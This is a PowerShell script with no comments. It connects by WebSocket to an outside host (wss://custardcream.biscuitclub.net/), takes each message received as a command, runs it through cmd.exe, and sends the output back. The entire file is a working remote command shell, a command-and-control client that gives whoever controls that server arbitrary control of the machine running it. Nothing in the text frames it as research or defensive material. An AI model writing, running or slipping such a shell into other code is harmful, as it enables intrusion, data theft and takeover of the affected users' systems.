$c_id = [System.GUID]::NewGuid()

$rx_q = New-Object 'System.Collections.Concurrent.ConcurrentQueue[String]'
$tx_q = New-Object 'System.Collections.Concurrent.ConcurrentQueue[String]'

$ws = New-Object Net.WebSockets.ClientWebSocket
$cts = New-Object Threading.CancellationTokenSource
$ct = New-Object Threading.CancellationToken($false)

$rx_j = {
    param($ws, $c_id, $rx_q)
    $buf = [Net.WebSockets.WebSocket]::CreateClientBuffer(1024,1024)
    $ct = [Threading.CancellationToken]::new($false)
    $t_res = $null

    while ($ws.State -eq [Net.WebSockets.WebSocketState]::Open) {
        $w_msg = ""
        do {
            $t_res = $ws.ReceiveAsync($buf, $ct)
            while (-not $t_res.IsCompleted -and $ws.State -eq [Net.WebSockets.WebSocketState]::Open) {
                [Threading.Thread]::Sleep(10)
            }

            $w_msg += [Text.Encoding]::UTF8.GetString($buf, 0, $t_res.Result.Count)
        } until (
            $ws.State -ne [Net.WebSockets.WebSocketState]::Open -or $t_res.Result.EndOfMessage
        )

        if (-not [string]::IsNullOrEmpty($w_msg)) {
            $rx_q.Enqueue($w_msg)
        }
   }
 }

 $tx_j = {
    param($ws, $c_id, $tx_q)

    $ct = New-Object Threading.CancellationToken($false)
    $workitem = $null
    while ($ws.State -eq [Net.WebSockets.WebSocketState]::Open){
        if ($tx_q.TryDequeue([ref] $workitem)) {
            [ArraySegment[byte]]$msg = [Text.Encoding]::UTF8.GetBytes($workitem)
            $ws.SendAsync(
                $msg,
                [System.Net.WebSockets.WebSocketMessageType]::Text,
                $true,
                $ct
            ).GetAwaiter().GetResult() | Out-Null
        }
    }
 }

Write-Output "Connecting..."
$conn = $ws.ConnectAsync("wss://custardcream.biscuitclub.net/", $cts.Token)
do { Sleep(1) }
until ($conn.IsCompleted)
Write-Output "Connected!"

$rx_r = [PowerShell]::Create()
$rx_r.AddScript($rx_j).
    AddParameter("ws", $ws).
    AddParameter("c_id", $c_id).
    AddParameter("rx_q", $rx_q).BeginInvoke() | Out-Null

$tx_r = [PowerShell]::Create()
$tx_r.AddScript($tx_j).
    AddParameter("ws", $ws).
    AddParameter("c_id", $c_id).
    AddParameter("tx_q", $tx_q).BeginInvoke() | Out-Null

try {
    do {
        $msg = $null
        while ($rx_q.TryDequeue([ref] $msg)) {
            if ($msg -eq "exit"){
                Write-Output "Done"
                $tx_q.Enqueue("endingwebsocket")
            }
            $pinfo = New-Object System.Diagnostics.ProcessStartInfo
            $pinfo.FileName = "cmd.exe"
            $pinfo.RedirectStandardError = $true
            $pinfo.RedirectStandardOutput = $true
            $pinfo.UseShellExecute = $false
            $pinfo.Arguments = "/c $msg"
            $p = New-Object System.Diagnostics.Process
            $p.StartInfo = $pinfo
            $p.Start() | Out-Null
            $p.WaitForExit()
            $stdout = $p.StandardOutput.ReadToEnd()
            $stderr = $p.StandardError.ReadToEnd()
            if ($p.ExitCode -ne 0){
                $tx_q.Enqueue($stderr)
            }else{
                $tx_q.Enqueue($stdout)
            }
        }
    } until ($ws.State -ne [Net.WebSockets.WebSocketState]::Open)
}
finally {
    Write-Output "Closing WS connection"
    $close = $ws.CloseAsync(
        [System.Net.WebSockets.WebSocketCloseStatus]::Empty,
        "",
        $ct
    )

    do { Sleep(1) }
    until ($close.IsCompleted)
    $ws.Dispose()

    $rx_r.Stop()
    $rx_r.Dispose()

    $tx_r.Stop()
    $tx_r.Dispose()
}